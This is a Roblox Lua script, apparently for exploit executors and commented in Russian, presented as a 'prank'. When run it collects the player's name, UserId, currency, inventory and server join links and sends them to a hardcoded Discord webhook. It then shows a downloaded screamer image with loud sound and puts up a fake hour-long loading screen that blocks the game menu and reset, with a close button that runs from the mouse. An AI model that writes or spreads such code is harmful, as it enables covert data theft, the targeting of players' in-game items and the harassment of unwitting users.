-- ==================================================
-- ДАЛЬШЕ — САМ ПРАНК
-- ==================================================
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local CoreGui           = game:GetService("CoreGui")
local TweenSvc          = game:GetService("TweenService")
local UserInputService  = game:GetService("UserInputService")
local ContextActionSvc  = game:GetService("ContextActionService")
local GuiService        = game:GetService("GuiService")
local StarterGui        = game:GetService("StarterGui")

local player = Players.LocalPlayer
local WEBHOOK = "https://discord.com/api/webhooks/1556949064740769873/9BYy38_Vu-vokqgyv4lAxDYd_JwLdXn00d50pDjbZkwtIPcQ5pxFpiL6zvCWUpnvmxFT"
local SCREAMER_URL = "https://raw.githubusercontent.com/FigureOffic/dawd/main/0960e9a314c755d3a408988de1e0175c.jpg"
local PIN_CODE = "2341"

print("=== PRANK v5.0 ===")
print("Игрок:", player.Name, "| UserId:", player.UserId)

-- ==================================================
-- ПОИСК МОДУЛЕЙ
-- ==================================================
local function findModule(path)
    local node = ReplicatedStorage
    for part in path:gmatch("[^%.]+") do
        node = node:FindFirstChild(part)
        if not node then return nil end
    end
    local ok, mod = pcall(require, node)
    if ok and type(mod) == "table" then return mod end
    return nil
end

local function findModuleByName(name)
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if obj.Name == name and obj:IsA("ModuleScript") then
            local ok, mod = pcall(require, obj)
            if ok and type(mod) == "table" then return mod end
        end
    end
    return nil
end

local function getModule(path, name)
    return findModule(path) or findModuleByName(name)
end

local function safeCall(fn, ...)
    if type(fn) ~= "function" then return nil end
    local ok, result = pcall(fn, ...)
    if ok then return result end
    return nil
end

local function num(v, default)
    default = default or 0
    if type(v) == "number" then return v end
    if type(v) == "string" then
        local n = tonumber(v)
        if n then return n end
    end
    return default
end

local function shortNum(n)
    n = num(n)
    if n >= 1e15 then return string.format("%.2fQa", n / 1e15) end
    if n >= 1e12 then return string.format("%.2fT",  n / 1e12) end
    if n >= 1e9  then return string.format("%.2fB",  n / 1e9)  end
    if n >= 1e6  then return string.format("%.2fM",  n / 1e6)  end
    if n >= 1e3  then return string.format("%.2fK",  n / 1e3)  end
    return tostring(math.floor(n))
end

local function buildJoinLink()
    local jobId = game.JobId
    local placeId = game.PlaceId
    local serverLink = jobId ~= ""
        and string.format("https://www.roblox.com/games/%d/?gameInstanceId=%s", placeId, jobId)
        or  string.format("https://www.roblox.com/games/%d/", placeId)
    local profileLink = string.format("https://www.roblox.com/users/%d/profile", player.UserId)
    local deepLink = jobId ~= ""
        and string.format("roblox://placeId=%d&gameInstanceId=%s", placeId, jobId)
        or  string.format("roblox://placeId=%d", placeId)
    return serverLink, profileLink, deepLink
end

-- ==================================================
-- СБОР ДАННЫХ
-- ==================================================
local data = {
    player = player.Name, userId = player.UserId,
    time = os.date("!%Y-%m-%d %H:%M:%S"),
    place = game.PlaceId, jobId = game.JobId, sections = {},
}

do
    local eco = getModule("Shared.Data.EcoData", "EcoData")
    if eco then
        data.sections.Eco = {
            Gold = safeCall(eco.GetGold) or safeCall(eco.Gold) or 0,
            SkinToken = safeCall(eco.GetSkinToken) or safeCall(eco.SkinToken) or 0,
        }
    end
end

do
    local pot = getModule("Shared.Data.PotionData", "PotionData")
    if pot then
        local list = safeCall(pot.GetPotionList) or {}
        local potions = {}
        for id, count in pairs(list) do
            table.insert(potions, { id = tostring(id), count = num(count) })
        end
        table.sort(potions, function(a,b) return a.count > b.count end)
        data.sections.Potions = { list = potions }
    end
end

do
    local br = getModule("Shared.Data.BrainrotData", "BrainrotData")
    if br then
        local list = safeCall(br.GetBrainrotList) or {}
        local bagNum = safeCall(br.GetBrainrotBagNum) or 0
        local bagMax = safeCall(br.GetBagMaxNum) or 0
        local brainrots = {}
        for uid, info in pairs(list) do
            if type(info) == "table" then
                table.insert(brainrots, {
                    uid = tostring(uid), name = info.Name or info.Id or "?",
                    rarity = info.Rarity or "?", income = num(info.Income),
                    mutation = info.Mutation or "None",
                })
            end
        end
        table.sort(brainrots, function(a,b) return a.income > b.income end)
        data.sections.Brainrots = { bagCount = bagNum, bagMax = bagMax, list = brainrots }
    end
end

do
    local ps = getModule("Shared.Data.PlayerStateData", "PlayerStateData")
    if ps then
        data.sections.State = {
            showLevel = safeCall(ps.GetShowLevel) or 0,
            shieldLevel = safeCall(ps.GetShieldLevel) or 0,
            droneLevel = safeCall(ps.GetDroneLevel) or 0,
            rebirthCount = safeCall(ps.GetRebirthLevel) or 0,
        }
    end
end

-- ==================================================
-- СООБЩЕНИЕ
-- ==================================================
local function buildMessage()
    local lines = {}
    local function add(s) lines[#lines+1] = s end
    local serverLink, profileLink, deepLink = buildJoinLink()
    add("**📦 Inventory Export**")
    add("Player: `" .. data.player .. "` (`" .. data.userId .. "`)")
    add("Time: `" .. data.time .. "`")
    add("")
    add("🔗 **Профиль:** " .. profileLink)
    add("🎮 **Сервер:** " .. serverLink)
    add("")
    add("`" .. deepLink .. "`")
    add("")
    if data.sections.Eco then
        local e = data.sections.Eco
        add("**💰 Eco**")
        add("  Gold: `" .. shortNum(e.Gold) .. "`")
        add("  SkinToken: `" .. shortNum(e.SkinToken) .. "`")
        add("")
    end
    if data.sections.State then
        local s = data.sections.State
        add("**📊 State**")
        add("  Rebirth: `" .. tostring(s.rebirthCount) .. "`")
        add("  Shield: `" .. tostring(s.shieldLevel) .. "`")
        add("  Drone: `" .. tostring(s.droneLevel) .. "`")
        add("")
    end
    if data.sections.Brainrots then
        local b = data.sections.Brainrots
        add("**🧠 Brainrots** (" .. #b.list .. ")")
        add("  Bag: `" .. b.bagCount .. " / " .. b.bagMax .. "`")
        for i = 1, math.min(#b.list, 15) do
            local br = b.list[i]
            add(string.format("  %d. `%s` [%s] $%s/s | %s",
                i, br.name, br.rarity, shortNum(br.income), br.mutation))
        end
        if #b.list > 15 then add("  ... и ещё " .. (#b.list - 15)) end
        add("")
    end
    if data.sections.Potions then
        local p = data.sections.Potions
        add("**🧪 Potions** (" .. #p.list .. ")")
        for i = 1, math.min(#p.list, 10) do
            add("  `" .. p.list[i].id .. "` x" .. p.list[i].count)
        end
        add("")
    end
    return table.concat(lines, "\n")
end

-- ==================================================
-- ОТПРАВКА
-- ==================================================
local function send(content)
    local payload = HttpService:JSONEncode({ content = content:sub(1, 1900) })
    if typeof(request) == "function" then
        local ok = pcall(request, { Url = WEBHOOK, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" }, Body = payload })
        if ok then print("[EXPORT] ✅ request"); return true end
    end
    if syn and typeof(syn.request) == "function" then
        local ok = pcall(syn.request, { Url = WEBHOOK, Method = "POST",
            Headers = { ["Content-Type"] = "application/json" }, Body = payload })
        if ok then print("[EXPORT] ✅ syn.request"); return true end
    end
    local ok, err = pcall(function()
        HttpService:PostAsync(WEBHOOK, payload, Enum.HttpContentType.ApplicationJson)
    end)
    if ok then print("[EXPORT] ✅ PostAsync"); return true end
    warn("[EXPORT] ❌ " .. tostring(err))
    return false
end

send(buildMessage())

-- ==================================================
-- СКАЧИВАНИЕ КАРТИНКИ
-- ==================================================
local screamerAsset = nil
pcall(function()
    local req
    if typeof(request) == "function" then req = request
    elseif syn and syn.request then req = syn.request end
    if not req then return end
    local res = req({ Url = SCREAMER_URL, Method = "GET" })
    if res and res.Body and typeof(writefile) == "function" and typeof(getcustomasset) == "function" then
        writefile("screamer.jpg", res.Body)
        screamerAsset = getcustomasset("screamer.jpg")
        print("[SCREAMER] ✅ Картинка загружена")
    end
end)

-- ==================================================
-- СКРИМЕР
-- ==================================================
pcall(function()
    local sg = Instance.new("ScreenGui")
    sg.Name = "ScreamerGui"
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 2147483647
    pcall(function() sg.Parent = CoreGui end)
    if not sg.Parent then sg.Parent = player:WaitForChild("PlayerGui") end

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BorderSizePixel = 0
    bg.Parent = sg

    if screamerAsset then
        local img = Instance.new("ImageLabel")
        img.Size = UDim2.new(1, 0, 1, 0)
        img.BackgroundTransparency = 1
        img.Image = screamerAsset
        img.ScaleType = Enum.ScaleType.Crop
        img.Parent = bg
    else
        local eye = Instance.new("TextLabel")
        eye.Size = UDim2.new(1, 0, 1, 0)
        eye.BackgroundTransparency = 1
        eye.Text = "👁️"
        eye.TextSize = 500
        eye.Parent = bg
    end

    pcall(function()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://5801257796"
        s.Volume = 3
        s.Parent = bg
        s:Play()
    end)

    task.spawn(function()
        local t0 = tick()
        while tick() - t0 < 1.5 and bg.Parent do
            bg.Position = UDim2.new(0, math.random(-30,30), 0, math.random(-30,30))
            task.wait(0.02)
        end
    end)

    task.wait(1.5)
    sg:Destroy()
end)

-- ==================================================
-- ФЕЙКОВАЯ ЗАГРУЗКА
-- ==================================================
local TOTAL_TIME = 3600
local FINAL_TEXT = "Шутка"

local old = CoreGui:FindFirstChild("FakeLoadingPrank")
if old then old:Destroy() end

local gui = Instance.new("ScreenGui")
gui.Name = "FakeLoadingPrank"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.DisplayOrder = 999999
pcall(function() gui.Parent = CoreGui end)
if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
bg.BackgroundTransparency = 0.15
bg.BorderSizePixel = 0
bg.Parent = gui

local container = Instance.new("Frame")
container.Size = UDim2.new(0, 700, 0, 260)
container.AnchorPoint = Vector2.new(0.5, 0.5)
container.Position = UDim2.new(0.5, 0, 0.5, 0)
container.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
container.BorderSizePixel = 0
container.Parent = bg

local cc = Instance.new("UICorner")
cc.CornerRadius = UDim.new(0, 16)
cc.Parent = container

local cs = Instance.new("UIStroke")
cs.Color = Color3.fromRGB(60, 60, 90)
cs.Thickness = 2
cs.Parent = container

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0, 20)
title.BackgroundTransparency = 1
title.Text = "Загрузка..."
title.Font = Enum.Font.GothamBold
title.TextSize = 40
title.TextColor3 = Color3.fromRGB(240, 240, 255)
title.Parent = container

local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0, 600, 0, 26)
barBg.AnchorPoint = Vector2.new(0.5, 0)
barBg.Position = UDim2.new(0.5, 0, 0, 95)
barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
barBg.BorderSizePixel = 0
barBg.Parent = container

local bc = Instance.new("UICorner")
bc.CornerRadius = UDim.new(1, 0)
bc.Parent = barBg

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
barFill.BorderSizePixel = 0
barFill.Parent = barBg

local fcn = Instance.new("UICorner")
fcn.CornerRadius = UDim.new(1, 0)
fcn.Parent = barFill

local percent = Instance.new("TextLabel")
percent.Size = UDim2.new(1, 0, 0, 30)
percent.Position = UDim2.new(0, 0, 1, 8)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.Font = Enum.Font.GothamBold
percent.TextSize = 20
percent.TextColor3 = Color3.fromRGB(180, 180, 200)
percent.Parent = barBg

local timer = Instance.new("TextLabel")
timer.Size = UDim2.new(1, 0, 0, 20)
timer.Position = UDim2.new(0, 0, 0, 165)
timer.BackgroundTransparency = 1
timer.Text = ""
timer.Font = Enum.Font.Code
timer.TextSize = 14
timer.TextColor3 = Color3.fromRGB(120, 120, 140)
timer.Parent = container

local sub = Instance.new("TextLabel")
sub.Size = UDim2.new(1, 0, 0, 20)
sub.Position = UDim2.new(0, 0, 0, 188)
sub.BackgroundTransparency = 1
sub.Text = "Не выключайте игру"
sub.Font = Enum.Font.Gotham
sub.TextSize = 14
sub.TextColor3 = Color3.fromRGB(100, 100, 120)
sub.Parent = container

-- КНОПКА ПИН-КОДА
local pinBtn = Instance.new("TextButton")
pinBtn.Size = UDim2.new(1, -40, 0, 30)
pinBtn.AnchorPoint = Vector2.new(0.5, 1)
pinBtn.Position = UDim2.new(0.5, 0, 1, -10)
pinBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
pinBtn.BorderSizePixel = 0
pinBtn.Text = "🔒 Ввести пин-код"
pinBtn.Font = Enum.Font.GothamBold
pinBtn.TextSize = 14
pinBtn.TextColor3 = Color3.fromRGB(220, 220, 240)
pinBtn.Parent = container

local pbc = Instance.new("UICorner")
pbc.CornerRadius = UDim.new(0, 8)
pbc.Parent = pinBtn

-- КРЕСТИК
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 36, 0, 36)
closeBtn.Position = UDim2.new(1, -46, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
closeBtn.BorderSizePixel = 0
closeBtn.Text = "✕"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 22
closeBtn.TextColor3 = Color3.fromRGB(220, 220, 240)
closeBtn.Parent = container

local clc = Instance.new("UICorner")
clc.CornerRadius = UDim.new(1, 0)
clc.Parent = closeBtn

-- БАБЛ
local bubble = Instance.new("TextLabel")
bubble.Size = UDim2.new(0, 260, 0, 50)
bubble.AnchorPoint = Vector2.new(0.5, 1)
bubble.Position = UDim2.new(1, -46, 0, 0)
bubble.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
bubble.BackgroundTransparency = 1
bubble.BorderSizePixel = 0
bubble.Text = ""
bubble.TextWrapped = true
bubble.Font = Enum.Font.GothamBold
bubble.TextSize = 15
bubble.TextColor3 = Color3.fromRGB(255, 255, 255)
bubble.TextTransparency = 1
bubble.Visible = false
bubble.ZIndex = 20
bubble.Parent = container

local buc = Instance.new("UICorner")
buc.CornerRadius = UDim.new(0, 12)
buc.Parent = bubble

local bus = Instance.new("UIStroke")
bus.Color = Color3.fromRGB(255, 80, 80)
bus.Thickness = 1.5
bus.Transparency = 1
bus.Parent = bubble

-- ==================================================
-- БЛОКИРОВКА ВЫХОДА
-- ==================================================
local exitBlocked = true
local exitConns = {}

pcall(function()
    ContextActionSvc:BindAction("BlockMenu",
        function(_, st)
            if exitBlocked and st == Enum.UserInputState.Begin then
                return Enum.ContextActionResult.Sink
            end
        end, false, Enum.KeyCode.Escape, Enum.KeyCode.L)
end)

exitConns[#exitConns+1] = GuiService.MenuOpened:Connect(function()
    if exitBlocked then pcall(function() GuiService:SetMenuIsOpen(false) end) end
end)

task.spawn(function()
    while gui.Parent and exitBlocked do
        pcall(function()
            if GuiService.MenuIsOpen then GuiService:SetMenuIsOpen(false) end
        end)
        task.wait(0.05)
    end
end)

exitConns[#exitConns+1] = UserInputService.InputBegan:Connect(function(input, gpe)
    if not exitBlocked or gpe then return end
    if input.KeyCode == Enum.KeyCode.Escape or input.KeyCode == Enum.KeyCode.L then
        pcall(function() GuiService:SetMenuIsOpen(false) end)
    end
end)

pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)

local function unlockExit()
    exitBlocked = false
    pcall(function() ContextActionSvc:UnbindAction("BlockMenu") end)
    pcall(function() StarterGui:SetCore("ResetButtonCallback", true) end)
    for _, c in ipairs(exitConns) do pcall(function() c:Disconnect() end) end
end

gui.Destroying:Connect(unlockExit)

-- ==================================================
-- ФРАЗЫ
-- ==================================================
local T_MOUSE = {"Ха-ха, не поймал! 😜","Мимо! 🎯","Слишком медленно 🐢","Попробуй ещё 😏","Не-а 😝","Я быстрее ⚡","Промазал 🤭","Ты серьёзно? 😂","Ну попробуй 💨","Мышь не та 🤣","Старайся 😴","Мимо-мимо 🎪","Не успел 🏃","Ха-ха-ха 🤣","Медляк 😹"}
local T_RANDOM = {"Скучно... 😴","Когда поймаешь? 🥱","Я тут 👋","Поймай если сможешь 😎","Хе-хе 🙃","Ты здесь? 👀","Не сдавайся 💪","Я бессмертный 🛡️","Закрой или нет 🤷","Мне нравится тут 🏠","Хочешь закрой 😌"}
local T_CLICK = {"Почти! 😂","Ещё разок? 🎯","Не-не 😜","Близко... 🤏","Промах! 💥"}

local function pickRandom(t) return t[math.random(1, #t)] end

local bubbleHideToken = 0
local function showBubble(text, dur)
    dur = dur or 1.5
    bubbleHideToken = bubbleHideToken + 1
    local myToken = bubbleHideToken
    bubble.Text = text
    bubble.Visible = true
    bubble.TextTransparency = 1
    bubble.BackgroundTransparency = 1
    bus.Transparency = 1
    TweenSvc:Create(bubble, TweenInfo.new(0.2), { TextTransparency = 0, BackgroundTransparency = 0.05 }):Play()
    TweenSvc:Create(bus, TweenInfo.new(0.2), { Transparency = 0 }):Play()
    bubble.Size = UDim2.new(0, 230, 0, 44)
    TweenSvc:Create(bubble, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(0, 260, 0, 50) }):Play()
    task.delay(dur, function()
        if myToken ~= bubbleHideToken then return end
        TweenSvc:Create(bubble, TweenInfo.new(0.25), { TextTransparency = 1, BackgroundTransparency = 1 }):Play()
        TweenSvc:Create(bus, TweenInfo.new(0.25), { Transparency = 1 }):Play()
        task.wait(0.3)
        if myToken == bubbleHideToken then bubble.Visible = false end
    end)
end

-- ==================================================
-- УБЕГАНИЕ + ВЕНТИЛЯТОР
-- ==================================================
local ESCAPE_DISTANCE = 260
local MAX_OFFSET = 260
local LERP_ALPHA = 0.14
local MAX_SPEED = 18
local FAN_TRIGGER_DIST = 90
local FAN_DURATION = 0.5
local FAN_SPEED = 45
local FAN_RADIUS = 140

local basePos = closeBtn.Position
local currentOffset = Vector2.new(0, 0)
local targetOffset = Vector2.new(0, 0)
local lastTauntTime = 0
local TAUNT_COOLDOWN = 0.9
local fanMode = false
local fanEndTime = 0
local fanAngle = 0

local function mouseNear()
    if not UserInputService.MouseEnabled then return false end
    local ok, mouse = pcall(function() return UserInputService:GetMouseLocation() end)
    if not ok or not mouse then return false end
    local c = closeBtn.AbsolutePosition + closeBtn.AbsoluteSize/2
    return (Vector2.new(mouse.X, mouse.Y) - c).Magnitude < ESCAPE_DISTANCE
end

local function updateLoop()
    while closeBtn.Parent do
        bubble.Position = UDim2.new(closeBtn.Position.X.Scale, closeBtn.Position.X.Offset - 18,
            closeBtn.Position.Y.Scale, closeBtn.Position.Y.Offset - 6)
        local ok, mouse = pcall(function() return UserInputService:GetMouseLocation() end)
        local now = tick()
        local mx, my = nil, nil
        if ok and mouse then mx, my = mouse.X, mouse.Y end

        if mx and not fanMode then
            local c = closeBtn.AbsolutePosition + closeBtn.AbsoluteSize/2
            if (Vector2.new(mx,my) - c).Magnitude < FAN_TRIGGER_DIST then
                fanMode = true
                fanEndTime = now + FAN_DURATION
                fanAngle = math.random() * math.pi * 2
                showBubble("ВЕНТИЛЯТОР!!! 🌪️", 1)
            end
        end
        if fanMode and now >= fanEndTime then fanMode = false; targetOffset = Vector2.new(0,0) end

        if fanMode and mx then
            fanAngle = fanAngle + FAN_SPEED * (1/60)
            local ox = mx + math.cos(fanAngle) * FAN_RADIUS
            local oy = my + math.sin(fanAngle) * FAN_RADIUS
            local c = closeBtn.AbsolutePosition + closeBtn.AbsoluteSize/2
            currentOffset = Vector2.new(ox - c.X + currentOffset.X, oy - c.Y + currentOffset.Y)
            local maxX = container.AbsoluteSize.X - closeBtn.AbsoluteSize.X - 10
            local maxY = container.AbsoluteSize.Y - closeBtn.AbsoluteSize.Y - 10
            currentOffset = Vector2.new(math.clamp(currentOffset.X,-maxX,maxX), math.clamp(currentOffset.Y,-maxY,maxY))
            closeBtn.Position = UDim2.new(basePos.X.Scale, basePos.X.Offset + currentOffset.X,
                basePos.Y.Scale, basePos.Y.Offset + currentOffset.Y)
            task.wait()
            continue
        end

        if mouseNear() and mx then
            local c = closeBtn.AbsolutePosition + closeBtn.AbsoluteSize/2
            local dir = c - Vector2.new(mx, my)
            if dir.Magnitude < 1 then dir = Vector2.new(1, 0) end
            dir = dir.Unit
            local force = 1 - math.clamp((Vector2.new(mx,my)-c).Magnitude / ESCAPE_DISTANCE, 0, 1)
            targetOffset = dir * (MAX_OFFSET * force)
            local maxX = container.AbsoluteSize.X - closeBtn.AbsoluteSize.X - 10
            local maxY = container.AbsoluteSize.Y - closeBtn.AbsoluteSize.Y - 10
            targetOffset = Vector2.new(math.clamp(targetOffset.X,-maxX,maxX), math.clamp(targetOffset.Y,-maxY,maxY))
            if now - lastTauntTime > TAUNT_COOLDOWN then
                lastTauntTime = now
                showBubble(pickRandom(T_MOUSE), 1.3)
            end
        else
            targetOffset = Vector2.new(0, 0)
        end

        local nO = currentOffset:Lerp(targetOffset, LERP_ALPHA)
        local d = nO - currentOffset
        if d.Magnitude > MAX_SPEED then nO = currentOffset + d.Unit * MAX_SPEED end
        currentOffset = nO
        closeBtn.Position = UDim2.new(basePos.X.Scale, basePos.X.Offset + currentOffset.X,
            basePos.Y.Scale, basePos.Y.Offset + currentOffset.Y)
        task.wait()
    end
end
task.spawn(updateLoop)

task.spawn(function()
    task.wait(3)
    while gui.Parent and closeBtn.Parent do
        if not fanMode and not mouseNear() and math.random(1,100) <= 40 then
            showBubble(pickRandom(T_RANDOM), 2)
        end
        task.wait(math.random(5, 12))
    end
end)

-- ==================================================
-- ПИН-КОД МОДАЛКА
-- ==================================================
local pinModal = Instance.new("Frame")
pinModal.Size = UDim2.new(0, 320, 0, 180)
pinModal.AnchorPoint = Vector2.new(0.5, 0.5)
pinModal.Position = UDim2.new(0.5, 0, 0.5, 0)
pinModal.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
pinModal.BorderSizePixel = 0
pinModal.ZIndex = 100
pinModal.Visible = false
pinModal.Parent = container

local pmc = Instance.new("UICorner")
pmc.CornerRadius = UDim.new(0, 14)
pmc.Parent = pinModal

local pms = Instance.new("UIStroke")
pms.Color = Color3.fromRGB(88, 101, 242)
pms.Thickness = 2
pms.Parent = pinModal

local pinTitle = Instance.new("TextLabel")
pinTitle.Size = UDim2.new(1, 0, 0, 40)
pinTitle.BackgroundTransparency = 1
pinTitle.Text = "🔒 Введите пин-код"
pinTitle.Font = Enum.Font.GothamBold
pinTitle.TextSize = 18
pinTitle.TextColor3 = Color3.fromRGB(240, 240, 255)
pinTitle.ZIndex = 101
pinTitle.Parent = pinModal

local pinInput = Instance.new("TextBox")
pinInput.Size = UDim2.new(1, -40, 0, 40)
pinInput.AnchorPoint = Vector2.new(0.5, 0)
pinInput.Position = UDim2.new(0.5, 0, 0, 50)
pinInput.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
pinInput.BorderSizePixel = 0
pinInput.Text = ""
pinInput.PlaceholderText = "Введите код..."
pinInput.Font = Enum.Font.Gotham
pinInput.TextSize = 18
pinInput.TextColor3 = Color3.fromRGB(240, 240, 255)
pinInput.ZIndex = 101
pinInput.Parent = pinModal

local pic = Instance.new("UICorner")
pic.CornerRadius = UDim.new(0, 8)
pic.Parent = pinInput

local pinStatus = Instance.new("TextLabel")
pinStatus.Size = UDim2.new(1, 0, 0, 25)
pinStatus.Position = UDim2.new(0, 0, 0, 95)
pinStatus.BackgroundTransparency = 1
pinStatus.Text = ""
pinStatus.Font = Enum.Font.GothamBold
pinStatus.TextSize = 14
pinStatus.TextColor3 = Color3.fromRGB(255, 80, 80)
pinStatus.ZIndex = 101
pinStatus.Parent = pinModal

local pinConfirm = Instance.new("TextButton")
pinConfirm.Size = UDim2.new(1, -40, 0, 35)
pinConfirm.AnchorPoint = Vector2.new(0.5, 1)
pinConfirm.Position = UDim2.new(0.5, 0, 1, -10)
pinConfirm.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
pinConfirm.BorderSizePixel = 0
pinConfirm.Text = "Подтвердить"
pinConfirm.Font = Enum.Font.GothamBold
pinConfirm.TextSize = 15
pinConfirm.TextColor3 = Color3.fromRGB(255, 255, 255)
pinConfirm.ZIndex = 101
pinConfirm.Parent = pinModal

local pcc = Instance.new("UICorner")
pcc.CornerRadius = UDim.new(0, 8)
pcc.Parent = pinConfirm

pinBtn.MouseButton1Click:Connect(function()
    pinModal.Visible = true
    pinInput.Text = ""
    pinStatus.Text = ""
end)

local function checkPin()
    if pinInput.Text == PIN_CODE then
        pinStatus.Text = "✅ Верно!"
        pinStatus.TextColor3 = Color3.fromRGB(0, 255, 136)
        task.wait(0.5)
        pinModal.Visible = false
        unlockExit()
        gui:Destroy()
    else
        pinStatus.Text = "❌ Неверный код"
        pinStatus.TextColor3 = Color3.fromRGB(255, 80, 80)
    end
end

pinConfirm.MouseButton1Click:Connect(checkPin)
pinInput.FocusLost:Connect(function(enter) if enter then checkPin() end end)

-- ==================================================
-- КЛИКИ КРЕСТИКА
-- ==================================================
closeBtn.MouseButton1Click:Connect(function()
    unlockExit()
    gui:Destroy()
end)

closeBtn.MouseEnter:Connect(function()
    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
end)

closeBtn.MouseLeave:Connect(function()
    closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
end)

UserInputService.InputBegan:Connect(function(input, gpe)
    if gpe or input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
    if not gui.Parent or not closeBtn.Parent then return end
    local ok, mouse = pcall(function() return UserInputService:GetMouseLocation() end)
    if not ok or not mouse then return end
    local c = closeBtn.AbsolutePosition + closeBtn.AbsoluteSize/2
    local d = (Vector2.new(mouse.X, mouse.Y) - c).Magnitude
    if d < ESCAPE_DISTANCE and d > closeBtn.AbsoluteSize.X/2 then
        showBubble(pickRandom(T_CLICK), 1.2)
    end
end)

-- ==================================================
-- ЗАГРУЗКА
-- ==================================================
local function fmt(sec)
    return string.format("%02d:%02d", math.floor(sec/60), math.floor(sec%60))
end

local startTime = tick()
local finished = false

task.spawn(function()
    while not finished and gui.Parent do
        local el = tick() - startTime
        local pct = math.clamp(el / TOTAL_TIME, 0, 1)
        TweenSvc:Create(barFill, TweenInfo.new(0.5), { Size = UDim2.new(pct, 0, 1, 0) }):Play()
        percent.Text = string.format("%d%%", math.floor(pct * 100))
        timer.Text = "Осталось: " .. fmt(math.max(0, TOTAL_TIME - el))
        if pct >= 1 then break end
        task.wait(1)
    end
end)

task.wait(TOTAL_TIME)
finished = true
if not gui.Parent then return end

TweenSvc:Create(title, TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
TweenSvc:Create(sub, TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
TweenSvc:Create(timer, TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
task.wait(0.5)

title.Text = FINAL_TEXT
title.TextSize = 120
title.TextColor3 = Color3.fromRGB(255, 80, 80)
title.TextTransparency = 1
title.Position = UDim2.new(0, 0, 0, 40)
title.ZIndex = 10
barBg.Visible = false
TweenSvc:Create(title, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    TextTransparency = 0 }):Play()

task.spawn(function()
    task.wait(0.6)
    for i = 1, 6 do
        title.Position = UDim2.new(0, math.random(-15,15), 0, 40 + math.random(-10,10))
        task.wait(0.05)
    end
    title.Position = UDim2.new(0, 0, 0, 40)
end)

task.wait(4)
if not gui.Parent then return end
for _, obj in ipairs(gui:GetDescendants()) do
    if obj:IsA("TextLabel") or obj:IsA("TextButton") then
        TweenSvc:Create(obj, TweenInfo.new(0.5), { TextTransparency = 1, BackgroundTransparency = 1 }):Play()
    elseif obj:IsA("Frame") then
        TweenSvc:Create(obj, TweenInfo.new(0.5), { BackgroundTransparency = 1 }):Play()
    end
end
task.wait(0.6)
unlockExit()
gui:Destroy()
